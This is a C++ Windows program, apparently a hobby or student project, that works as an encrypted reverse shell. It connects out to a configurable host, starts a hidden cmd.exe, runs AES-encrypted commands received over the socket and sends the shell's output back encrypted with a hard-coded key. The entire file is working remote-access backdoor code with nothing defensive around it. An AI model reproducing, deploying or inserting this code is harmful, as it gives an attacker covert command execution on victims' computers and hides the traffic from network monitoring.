// WindowsProject1.cpp : Defines the entry point for the application.
//

#define WIN32_LEAN_AND_MEAN

#include <tchar.h>
#include <string>
#include <stdio.h>
#include <ws2tcpip.h>
#include <thread>
#include "plusaes.hpp"
#include <random>

#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_HOST "localhost"
#define DEFAULT_PORT "15970"
#define DEFAULT_BUFLEN 8192
#define AES_KEY {\
0x59, 0x71, 0x33, 0x74, 0x36, 0x77, 0x39, 0x7A,\
0x24, 0x43, 0x26, 0x46, 0x29, 0x4A, 0x40, 0x4E,\
0x63, 0x52, 0x66, 0x55, 0x6A, 0x57, 0x6E, 0x5A,\
0x72, 0x34, 0x75, 0x37, 0x78, 0x21, 0x41, 0x25\
}

#define AES_IV {\
0x43, 0x2A, 0x46, 0x2D, 0x4A, 0x61, 0x4E, 0x64,\
0x52, 0x67, 0x55, 0x6B, 0x58, 0x70, 0x32, 0x73\
}

#define RANDOM_PREFIX_SIZE 16

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;


using namespace std;

void ShowError(const string& error)
{
	MessageBox(NULL, error.c_str(), _T("Ошибка"), MB_OK | MB_ICONERROR);
}

void ShowErrorWithCode(const string& error, int code)
{
	ShowError(error + to_string(code));
}

bool CreatePipes()
{
	SECURITY_ATTRIBUTES saAttr;

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
	{
		ShowError("Невозможно создать выходную трубу");
		return false;
	}
	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
	{
		ShowError("Невозможно настроить выходную трубу");
		return false;
	}
	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
	{
		ShowError("Невозможно создать входную трубу");
		return false;
	}
	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
	{
		ShowError("Невозможно настроить входную трубу");
		return false;
	}
	return true;
}

bool CreateChildProcess()
{
	if (!CreatePipes())
		return false;

	TCHAR szCmdline[] = TEXT("cmd");
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	bSuccess = CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo);

	if (!bSuccess)
	{
		ShowErrorWithCode("Ошибка создания процесса: ", GetLastError());
		return false;
	}
	else
	{
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
		CloseHandle(g_hChildStd_OUT_Wr);
		CloseHandle(g_hChildStd_IN_Rd);
	}
	return true;
}

bool WriteToPipe(const TCHAR* command)
{
	DWORD dwRead, dwWritten;
	BOOL bSuccess = FALSE;
	dwRead = strlen(command);

	for (;;)
	{
		bSuccess = WriteFile(g_hChildStd_IN_Wr, command, dwRead, &dwWritten, NULL);
		if (!bSuccess)
		{
			ShowErrorWithCode("Ошибка записи в процесс: ", GetLastError());
			return false;
		}
		break;
	}
	FlushFileBuffers(g_hChildStd_IN_Wr);
	return true;
}

void ReadFromPipe(SOCKET ConnectSocket)
{
	DWORD dwRead;
	CHAR chBuf[DEFAULT_BUFLEN];
	BOOL bSuccess = FALSE;
	random_device random;
	for (;;)
	{
		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, DEFAULT_BUFLEN, &dwRead, NULL);
		if (!bSuccess || dwRead == 0) break;

		vector<BYTE> plain;
		for (int i = 0; i < RANDOM_PREFIX_SIZE; i++)
			plain.push_back((BYTE)random());
		for (int i = 0; i < (int)dwRead; i++)
			plain.push_back(chBuf[i]);
		const unsigned long encrypted_size = plusaes::get_padded_encrypted_size(plain.size());
		vector<BYTE> encrypted(encrypted_size);
		vector<BYTE> key = AES_KEY;
		BYTE iv[16] = AES_IV;
		plusaes::encrypt_cbc(plain.data(), plain.size(), &key[0], key.size(), &iv, &encrypted[0], encrypted.size(), true);

		auto size = encrypted.size();
		auto iResult = send(ConnectSocket, (const char*)&size, sizeof(size), 0);
		if (iResult == SOCKET_ERROR)
		{
			ShowErrorWithCode(_T("Ошибка отправки: "), WSAGetLastError());
			break;
		}
		iResult = send(ConnectSocket, (const char*)encrypted.data(), encrypted.size(), 0);
		if (iResult == SOCKET_ERROR)
		{
			ShowErrorWithCode(_T("Ошибка отправки: "), WSAGetLastError());
			break;
		}
		if (!bSuccess) break;
		//Sleep(100);
	}
	closesocket(ConnectSocket);
	WSACleanup();
	ExitProcess(0);
}

bool CreateSocket(WSADATA& wsaData, SOCKET& ConnectSocket)
{
	struct addrinfo* result = NULL;
	struct addrinfo* ptr = NULL;
	struct addrinfo hints;

	int iResult;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		ShowErrorWithCode(_T("Ошибка запуска WSA: "), iResult);
		return false;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo(DEFAULT_HOST, DEFAULT_PORT, &hints, &result);
	if (iResult != 0)
	{
		ShowErrorWithCode(_T("Ошибка получения адреса: "), iResult);
		WSACleanup();
		return false;
	}

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET)
		{
			ShowErrorWithCode(_T("Ошибка сокета: "), WSAGetLastError());
			WSACleanup();
			return false;
		}

		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR)
		{
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET)
	{
		ShowError(_T("Невозможно подключиться к серверу!"));
		WSACleanup();
		return false;
	}

	return true;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	int iResult;

	if (!CreateSocket(wsaData, ConnectSocket))
		return 1;

	if (!CreateChildProcess())
	{
		closesocket(ConnectSocket);
		WSACleanup();
		ExitProcess(1);
	}

	std::thread readThread(ReadFromPipe, ConnectSocket);

	int recvResult;
	bool isFirstRcv = true;
	do
	{
		int buffSize;
		iResult = recv(ConnectSocket, (char*)&buffSize, sizeof(buffSize), 0);

		if (iResult < 0)
		{
			auto errorCode = WSAGetLastError();
			if (errorCode != WSAECONNRESET || isFirstRcv)
				ShowErrorWithCode(_T("При получении команды возникла ошибка: "), errorCode);
			break;
		}
		else if (iResult == 0)
		{
			break;
		}
		isFirstRcv = false;

		unique_ptr<char[]> recvbuf(new char[buffSize]);

		iResult = recv(ConnectSocket, recvbuf.get(), buffSize, 0);
		recvResult = iResult;

		if (iResult > 0)
		{
			unsigned long padded_size = 0;
			vector<BYTE> decrypted(buffSize);
			vector<BYTE> key = AES_KEY;
			BYTE iv[16] = AES_IV;

			plusaes::decrypt_cbc((BYTE*)recvbuf.get(), buffSize, &key[0], key.size(), &iv, &decrypted[0], decrypted.size(), &padded_size);
			decrypted.resize(decrypted.size() - padded_size);

			string command(decrypted.begin() + RANDOM_PREFIX_SIZE, decrypted.end());
			if (!WriteToPipe(command.c_str()))
				break;
		}
		else if (iResult < 0)
		{
			auto errorCode = WSAGetLastError();
			if (errorCode != WSAECONNRESET || isFirstRcv)
				ShowErrorWithCode(_T("При получении команды возникла ошибка: "), errorCode);
			break;
		}
		else if (iResult == 0)
		{
			break;
		}
		isFirstRcv = false;

	} while (recvResult > 0);

	closesocket(ConnectSocket);
	WSACleanup();
	ExitProcess(0);
}
